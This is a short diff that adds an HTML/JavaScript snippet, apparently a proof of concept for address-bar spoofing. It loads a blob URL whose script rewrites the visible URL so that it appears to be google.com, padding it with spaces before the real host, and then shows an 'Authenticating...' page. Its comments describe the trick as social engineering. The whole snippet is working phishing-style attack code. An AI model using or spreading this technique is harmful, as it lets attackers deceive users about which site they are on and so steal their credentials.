@@ -1,0 +1,17 @@
+<script>
+    const fakeOrigin = 'https://google.com';
+    const payload = `
+      <script>
+        // Change the visible URL in the address bar
+        history.replaceState({}, '', 'blob:${location.protocol}//google.com${' '.repeat(1024)}@${location.host}/');
+    
+        // Optional: Additional social engineering or redirect triggers
+        document.body.innerHTML = '<h1>Authenticating...</h1>';
+        // window.setTimeout(() => location.href = 'https://google.com', 3000); // Optional redirect
+      <\/script>
+    `;
+    
+    const blob = new Blob([payload], { type: 'text/html' });
+    const blobUrl = URL.createObjectURL(blob);
+    location.href = blobUrl;
+    </script>
